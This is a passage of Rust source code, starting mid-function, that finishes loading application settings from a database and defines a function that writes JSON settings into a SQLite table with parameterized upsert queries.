            if let Ok(val) = serde_json::from_str::<serde_json::Value>(&value_str) {
                settings_map.insert(key, val);
            }
        }
    }

    Ok(serde_json::Value::Object(settings_map))
}

pub fn update_settings_impl(db: &crate::db::Database, payload: serde_json::Value) -> Result<serde_json::Value, String> {
    let conn = db.conn.lock().map_err(|e| e.to_string())?;
    
    if let Some(obj) = payload.as_object() {
        for (key, val) in obj {
            let val_str = serde_json::to_string(val).unwrap_or_else(|_| "{}".to_string());
            conn.execute(
                "INSERT INTO settings (key, value) VALUES (?1, ?2) ON CONFLICT(key) DO UPDATE SET value = excluded.value",
                params![key, val_str]
            ).map_err(|e| e.to_string())?;
        }
    }

    // Return the updated settings
    get_settings_impl(db)
}

